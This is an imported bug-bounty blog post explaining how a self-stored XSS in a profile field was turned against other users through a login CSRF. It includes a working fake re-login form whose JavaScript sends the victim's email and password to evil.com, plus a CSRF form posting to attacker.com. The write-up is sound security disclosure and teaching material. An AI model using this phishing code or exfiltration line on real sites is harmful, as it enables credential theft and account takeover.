---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-06-20_self-xss-to-evil-xss.md
original_filename: 2019-06-20_self-xss-to-evil-xss.md
title: Self XSS To Evil XSS
category: documents
detected_topics:
- xss
- command-injection
- otp
- csrf
tags:
- imported
- documents
- xss
- command-injection
- otp
- csrf
language: en
raw_sha256: 6055a227877e1467e7563f8811e1b029c5a6df67816c5ce813ccd3405100d03c
text_sha256: 68efdb4cc5391344928cddc7dc896640bdcc31e06689705d9ee138dc72a19c7d
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: true
---

# Self XSS To Evil XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-06-20_self-xss-to-evil-xss.md
- Source Type: markdown
- Detected Topics: xss, command-injection, otp, csrf
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: True
- Raw SHA256: `6055a227877e1467e7563f8811e1b029c5a6df67816c5ce813ccd3405100d03c`
- Text SHA256: `68efdb4cc5391344928cddc7dc896640bdcc31e06689705d9ee138dc72a19c7d`


## Content

---
title: "Self XSS To Evil XSS"
url: "https://medium.com/@saadahmedx/self-xss-to-evil-xss-bcf2494a82a4"
authors: ["Saad Ahmed (@XSaadAhmedX)"]
bugs: ["XSS"]
publication_date: "2019-06-20"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5196
scraped_via: "browseros"
---

# Self XSS To Evil XSS

Self XSS To Evil XSS
Saad Ahmed
Follow
3 min read
·
Jun 21, 2019

99

6

Hi guy I hope you all are fine this POC is all about how I convert the Self XSS To Evil XSS so let assume the site PRIVATE.COM

The first step simply sign-up and login to the account & start playing with the change account details functionality after some time I find out that the first name field is vulnerable to xss but the problem is this is self stored xss so I need to convert this xss to exploit other users I check the 1st method through CSRF but there is a CSRF token in the account update functionality so this method fail & then I remember GEEK BOY POC.

Get Saad Ahmed’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

So simple created the html + js code to steal email & pass of victim.

<!DOCTYPE html>
<html>
<head>
  <title>XSS</title>
</head>
<body>

  <center><div class="panel-body">
  <h3>Something Went Wrong Please Login Again</h3>

  <div class="login-group">
  <label for="email" class="control-label">Email</label>
  <input  id="Vemail" class="input span12" name="email" required="" type="email" value="" autofocus="">
  </div>

  <div class="login-group">
  <label for="password" class="control-label">Password</label>
  <input id="Vpass" class="input span12" name="password" required="" type="password" value="">
  <div class="alert alert-error error hide" id="error_missingPassword">Please enter your password</div>
  </div>

  <button class="action-button btn btn-primary login-button" buttontype="login" type="submit" onclick="myFunction()">Login</button>

  </div>

  <script>
  function myFunction() {
  var x = document.getElementById("Vemail").value;
  var y = document.getElementById("Vpass").value;
  var pwd=***REDACTED*** + ":" + y;
  alert(pwd);
  window.location = "https://evil.com/" + pwd;
  }
  </script>

</body>
</html>

This is a simple html code with 2 input fields with 1 button asking for Email and Password & the JS code simply get the input field value & send it to attacker server and upload the code the web host.

Press enter or click to view image in full size

Simply use I frame to load the code from web host.

Press enter or click to view image in full size

This is how i look like.

Press enter or click to view image in full size

Everything is good now all I need is to send the user this form.

<html>
  <body>
  <form action="https://attacker.com/login/submit" method="POST">
  <input type="hidden" name="email" value="email@gmail.com" />
  <input type="hidden" name="password" value="password" />
  <input type="submit" value="Submit request" />
  </form>
  </body>
</html>

This is simply make victim to login in my account without knowing him & when he login in my account he see the msg Something Went Wrong with input fields & try to login when he try the JS code simply get the email & pass victim enter and send it to attacker server

Press enter or click to view image in full size

I hope you like it :)

./Logout
